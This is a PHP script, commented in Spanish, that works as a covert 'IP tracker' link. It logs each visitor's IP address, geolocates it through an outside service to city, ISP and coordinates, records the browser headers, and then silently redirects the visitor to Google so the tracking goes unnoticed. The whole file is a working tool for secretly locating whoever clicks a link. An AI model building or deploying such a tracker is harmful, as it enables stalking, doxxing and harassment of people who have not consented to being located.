<?php
// -----------------------------
// index.php - IP tracker robusto
// Escribe logs y redirige al visitante a Google
// -----------------------------

date_default_timezone_set('UTC'); // ajusta si quieres otra zona

// CONFIGURACIÓN:
// opcionalmente cambia $IGNORE_IP por tu IP para no registrar tus pruebas
$IGNORE_IP = ''; // ej "203.0.113.5" ó deja '' para no ignorar

// posibles rutas de log en orden de preferencia:
// 1) ruta fuera del web root (si creada por el setup script)
// 2) ruta dentro del webroot (por permisos)
$candidate_paths = [
    '/home/' . (getenv('SUDO_USER') ?: getenv('USER') ?: 'anonimus') . '/ip_tracker_logs/ips.txt',
    __DIR__ . '/ips.txt'
];

// determina el archivo de log usable
$logfile = null;
foreach ($candidate_paths as $p) {
    $dir = dirname($p);
    if (!is_dir($dir)) {
        // intentar crear carpeta si posible
        @mkdir($dir, 0775, true);
    }
    // crear fichero si no existe
    if (!file_exists($p)) {
        @touch($p);
    }
    // test escritura
    if (is_writable($p)) {
        $logfile = $p;
        break;
    }
}
// última opción: intento crear en /tmp
if ($logfile === null) {
    $tmp = sys_get_temp_dir() . '/ips.txt';
    @touch($tmp);
    if (is_writable($tmp)) $logfile = $tmp;
}

if ($logfile === null) {
    // sin fichero de log escribible -> no podemos continuar con log, pero redirect igual
    header("Location: https://www.google.com");
    exit;
}

// -----------------------------
// Helpers
// -----------------------------
function get_client_ip() : string {
    $keys = [
        'HTTP_CF_CONNECTING_IP', // Cloudflare
        'HTTP_X_REAL_IP',
        'HTTP_X_FORWARDED_FOR',
        'HTTP_CLIENT_IP',
        'REMOTE_ADDR'
    ];
    foreach ($keys as $k) {
        if (!empty($_SERVER[$k])) {
            $v = $_SERVER[$k];
            // X-Forwarded-For puede contener lista
            if (strpos($v, ',') !== false) {
                $parts = array_map('trim', explode(',', $v));
                // devolver la primera que parezca pública
                foreach ($parts as $ip) {
                    if (filter_var($ip, FILTER_VALIDATE_IP)) return $ip;
                }
            } else {
                if (filter_var($v, FILTER_VALIDATE_IP)) return $v;
            }
        }
    }
    return 'IP desconocida';
}

function is_private_ip(string $ip) : bool {
    if ($ip === 'IP desconocida') return true;
    // IPv4 private ranges + localhost
    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
        $long = ip2long($ip);
        $ranges = [
            ['10.0.0.0', '10.255.255.255'],
            ['172.16.0.0', '172.31.255.255'],
            ['192.168.0.0', '192.168.255.255'],
            ['127.0.0.0', '127.255.255.255']
        ];
        foreach ($ranges as $r) {
            if ($long >= ip2long($r[0]) && $long <= ip2long($r[1])) return true;
        }
        return false;
    }
    // IPv6 checks: loopback ::1 and unique local fc00::/7
    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6)) {
        if ($ip === '::1') return true;
        $lower = strtolower($ip);
        if (strpos($lower, 'fc') === 0 || strpos($lower, 'fd') === 0) return true;
        return false;
    }
    return true;
}

function geo_lookup_ip(string $ip) : array {
    // usa ip-api.com (gratuita); manejamos timeout y fallos
    $default = [
        'status' => 'fail',
        'country' => 'Desconocido',
        'regionName' => 'Desconocido',
        'city' => 'Desconocido',
        'isp' => 'Desconocido',
        'lat' => null,
        'lon' => null,
        'query' => $ip
    ];
    // no lookup for private IPs
    if (is_private_ip($ip)) {
        return $default;
    }
    $url = "http://ip-api.com/json/{$ip}?fields=status,country,regionName,city,isp,lat,lon,query";
    $opts = [
        'http' => [
            'method' => "GET",
            'timeout' => 3 // segundos
        ]
    ];
    $context = stream_context_create($opts);
    $raw = @file_get_contents($url, false, $context);
    if ($raw === false) return $default;
    $data = @json_decode($raw, true);
    if (!is_array($data) || ($data['status'] ?? '') !== 'success') return $default;
    return $data + $default;
}

// acorta user-agent para evitar logs gigantes
function safe_ua(string $ua, int $max = 300) : string {
    $ua = trim($ua);
    if (strlen($ua) > $max) return substr($ua,0,$max) . '...';
    return $ua;
}

// escapar texto para log simple (no JSON)
function esc_log(string $s) : string {
    return str_replace(["\r","\n"], ['',''], $s);
}

// -----------------------------
// Recolectar datos
// -----------------------------
$ip = get_client_ip();
if ($ip === '') $ip = 'IP desconocida';

// ignorar si coincide con IP de testing
if (!empty($IGNORE_IP) && $ip === $IGNORE_IP) {
    header("Location: https://www.google.com");
    exit;
}

$now = (new DateTime())->format('Y-m-d H:i:s');
$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'User-Agent desconocido';
$ua = safe_ua($ua, 600);
$accept_lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '';
$referer = $_SERVER['HTTP_REFERER'] ?? '';
$method = $_SERVER['REQUEST_METHOD'] ?? '';
$path = $_SERVER['REQUEST_URI'] ?? '';

// Geo lookup (only if public IP)
$geo = geo_lookup_ip($ip);
$country = $geo['country'] ?? 'Desconocido';
$region = $geo['regionName'] ?? 'Desconocido';
$city = $geo['city'] ?? 'Desconocido';
$isp = $geo['isp'] ?? 'Desconocido';
$lat = $geo['lat'] ?? '';
$lon = $geo['lon'] ?? '';

// -----------------------------
// Formatear log y escribir atómicamente
// -----------------------------
$logline = sprintf(
    "[%s] IP: %-45s Country: %-15s Region: %-15s City: %-15s ISP: %-25s LatLon: %-18s Method: %-6s UA: %s Accept-Lang: %s Referer: %s URI: %s\n",
    $now,
    esc_log($ip),
    esc_log($country),
    esc_log($region),
    esc_log($city),
    esc_log($isp),
    ($lat !== '' ? "{$lat},{$lon}" : 'N/A'),
    esc_log($method),
    esc_log($ua),
    esc_log($accept_lang),
    esc_log($referer),
    esc_log($path)
);

// escribir
@file_put_contents($logfile, $logline, FILE_APPEND | LOCK_EX);

// -----------------------------
// Redirigir al usuario a Google (transparente)
// -----------------------------
header("Location: https://www.google.com");
exit;
?>
